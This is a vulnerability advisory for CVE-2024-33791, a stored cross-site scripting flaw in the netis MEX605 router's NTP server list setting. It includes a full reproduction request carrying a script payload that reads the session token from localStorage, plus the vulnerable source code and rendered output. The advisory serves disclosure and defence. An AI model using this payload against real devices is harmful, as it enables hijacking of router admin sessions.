# CVE-2024-33791

- [netis MEX605](#netis-mex605)
  * [Target](#target)
  * [Bug Type](#bug-type)
  * [Abstract](#abstract)
  * [Reproduce](#reproduce)
  * [Details](#details)
    + [Bug Causes](#bug-causes)
  * [Conclusion](#conclusion)
  * [Discoverer](#discoverer)

## Target

netis MEX605 Router

| Firmware Version | Availability |
| --- | --- |
| 2.00.06 | True |

## Bug Type

Cross Site Scripting

## Abstract

Insufficient validation of the input value for the domain name, which is the input value of the list of servers present in the System -> Time Settings menu on the router, enables cross-site scripting when you run Save Settings.

## Reproduce

### Request

```bash
POST /ubus HTTP/1.1
Host: 192.168.1.1
Content-Length: 275
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.1
Referer: http://192.168.1.1/timeSetting.html
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"jsonrpc":"2.0","id":19,"method":"call","params":["12588af66047ea713c7352417e2b2551","uci","set",{"config":"system","type":"timeserver","values":{"server":["\"<script>alert(localStorage.getItem('token_id'))</script>","1.openwrt.pool.ntp.org","2.openwrt.pool.ntp.org","3.openwrt.pool.ntp.org"],"enabled":"1"}}]}
```

### Response

```bash
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Content-Length: 38

{"jsonrpc":"2.0","id":19,"result":[0]}
```

## Details

### Bug Causes

`/www/timeSetting.html:76`

```bash
<div class="ntp_div">
        
        
        <div class="form-group clearfix">
                <label class="col-xs-6 col-sm-4 col-md-4 col-lg-4 f-label"></label>
                <div class="col-xs-6 col-sm-8 col-md-8 col-lg-8 f-control coverSelect">
                        <select class="allChange" id="time_zone_sel"></select>
                </div>
        </div>
        
        <div class="form-group clearfix">
                <label class="col-xs-6 col-sm-4 col-md-4 col-lg-4 f-label"></label>
                <div class="col-xs-6 col-sm-8 col-md-8 col-lg-8 f-control">
                        <table id="ntp_server_list" class="table table-striped editableTable">
                                <thead>
                                        <tr>
                                                
[1]                                             <th class="text-center domain_name_txt"></th>
                                        </tr>
                                </thead>
                                <tbody id="editableTable">
                                </tbody>
                                
                                
                        </table>
                </div>
        </div>
        
</div>
...<snip>...
<div class="form-group clearfix">
        <label class="col-xs-6 col-sm-4 col-md-4 col-lg-4 f-label"></label>
        <div class="col-xs-6 col-sm-8 col-md-8 col-lg-8 f-control">
[2]             <button type="submit" class="btn btn-save" onClick="submitNTP()"></button>
        </div>
</div>
```

`/www/js/timeSetting.js:180`

```bash
function submitNTP(){
        
        var eb=$(':radio[name="get_time_mode0"]:checked').val();
        var server=[]
        if(eb==1){
                for(var i=0;i<4;i++){
[3]                     var a=$(".editInput").eq(i).val();
                        if(a){
[4]                             server.push(a);
                        }
                }
                if(server.length>0&&server.length!=4){
                        //                      alert("服务器列表可以为空，或者必须传4个");
                        return;
                }
                submitData.timezone=$("#time_zone_sel").val();
                submitData.zonename=$("#time_zone_sel").find("option:selected").text().replace(/\(.*?\)/g,'');
                
                show_message("save");
                var set1={"jsonrpc": "2.0", "id": 18, "method": "call", "params": [ localStorage.getItem('token_id'), "uci", "set", {"config": "system","type": "system","values":submitData} ] }
                set1=JSON.stringify(set1);
[5]             var set3={"jsonrpc": "2.0", "id": 19, "method": "call", "params": [ localStorage.getItem('token_id'), "uci", "set", {"config": "system","type": "timeserver","values":{"server":server,"enabled":eb}} ] }
                set3=JSON.stringify(set3);
                
                $.when(setDataFn(set1),setDataFn(set3)).then(function(data1,data){
                        data1=JSON.stringify(data1);
                        data1 = eval("(" + data1 + ")");
                        data=JSON.stringify(data);
[6]                     data = eval("(" + data + ")");
```

`/etc/config/system` 

```
config timeserver 'ntp'
        option enable_server '0'
        option enabled '1'
[7]     list server '0.openwrt.pool.ntp.org\"><script>alert(localStorage.getItem("token_id"))</script>'
        list server '1.openwrt.pool.ntp.org'
        list server '2.openwrt.pool.ntp.org'
        list server '3.openwrt.pool.ntp.org'
```

`/www/js/timeSetting.js:101`

```bash
function getTimeZone(){
        var a1='{"jsonrpc": "2.0", "id": 18, "method": "call", "params": [ "'+localStorage.getItem('token_id')+'", "uci", "get", {"config": "system"} ] }'
        
[8]     request({
                url:"/ubus",
                data:a1
        }).done(function(data){
                data=JSON.stringify(data);
                data = eval("(" + data + ")");
                if(check_data(data)){
                        handleTable(data.result[1].values.ntp.server);
                        change_get_time_mode(data.result[1].values.ntp.enabled);
                        $("#time_zone_sel").val(data.result[1].values.cfg01e48a.timezone);
                }
        }).fail(function(data){
                //show_request_err(data);
        })
```

```bash
<td>
	<input class="f-border editInput" onblur="changeInput(this)" value="0.openwrt.pool.ntp.org\&quot;">
[9]	<script>alert(localStorage.getItem("token_id"))</script>&gt;
</td>
```

`server` is not filtered.
it occurs cross site scripting in `getTimeZone` function.[8]

## Conclusion

Malicious Input can cause Cross Site Scripting in `getTimeZone` function.

It can be used as malicious way.

## Discoverer

CoreSecurity OT/ICS Research Team
